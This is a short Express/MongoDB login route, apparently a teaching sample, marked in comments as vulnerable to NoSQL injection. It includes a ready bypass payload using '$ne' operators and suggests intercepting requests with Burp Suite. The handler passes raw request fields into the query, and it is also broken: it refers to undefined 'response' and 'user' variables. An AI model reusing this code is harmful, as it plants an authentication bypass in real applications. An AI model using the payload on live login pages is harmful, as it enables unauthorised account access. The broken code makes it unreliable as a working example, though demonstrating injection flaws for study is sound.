//Attention! vulnerable to NoSQL code. Do not use it

//Payload to bypass this login page (Intercept with any comfortable tool, exaple burp suite)

//{"username":{"$ne":null},"password":{"$ne":null}}

app.post('/login', function (req, res){
    let query = {
        username: req.body.username,
        password: req.body.password
    }
 
    db.collection('user').find(query, function (err) {
        if (err) {
            response.status(401).json({
                status: "error",
                message: "Invalid credentials.",
              });
        } else {
            if (user.length >= 1) {
                res.json({username: user[0].username });
            }
        }
    });
});

